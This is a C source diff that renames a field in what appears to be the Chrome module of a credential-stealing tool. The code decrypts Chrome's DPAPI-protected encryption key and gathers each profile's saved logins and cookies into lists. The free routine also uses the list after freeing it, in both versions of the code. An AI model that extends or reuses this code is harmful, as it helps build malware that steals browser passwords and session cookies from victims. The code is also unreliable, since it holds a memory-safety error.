@@ -34,7 +34,7 @@ struct LF_Chrome_profile_data_struct
 };
 struct LF_Chrome_data_struct
 {
-  struct LF_Utils_arraylist_struct *profile_list;
+  struct LF_Utils_arraylist_struct *profile_data_list;
 };
 
 void
@@ -202,13 +202,14 @@ LF_Chrome_populate_data (struct LF_Chrome_data_struct *out)
   char *decrypted_key = LF_Crypter_decrypt_dpapi (
       encryption_key, encryption_key_len, &decrypted_key_len);
 
-  out->profile_list = LF_Utils_arraylist_new_default ();
+  out->profile_data_list = LF_Utils_arraylist_new_default ();
 
-  LF_Chrome__populate_profile_arraylist (userdata_path, out->profile_list);
-  for (int i = 0; i < out->profile_list->length; i++)
+  LF_Chrome__populate_profile_arraylist (userdata_path,
+                                         out->profile_data_list);
+  for (int i = 0; i < out->profile_data_list->length; i++)
     {
       struct LF_Chrome_profile_data_struct *profile_data
-          = LF_Utils_arraylist_get (out->profile_list, i);
+          = LF_Utils_arraylist_get (out->profile_data_list, i);
 
       profile_data->login_data_list = LF_Utils_arraylist_new_default ();
       profile_data->cookie_data_list = LF_Utils_arraylist_new_default ();
@@ -240,11 +241,11 @@ LF_Chrome_populate_data (struct LF_Chrome_data_struct *out)
 void
 LF_Chrome_free_data (struct LF_Chrome_data_struct *out)
 {
-  LF_Utils_arraylist_free (out->profile_list);
-  for (int i = 0; i < out->profile_list->length; i++)
+  LF_Utils_arraylist_free (out->profile_data_list);
+  for (int i = 0; i < out->profile_data_list->length; i++)
     {
       LF_Utils_arraylist_free (
           (struct LF_Utils_arraylist_struct *)LF_Utils_arraylist_get (
-              out->profile_list, i));
+              out->profile_data_list, i));
     }
 }
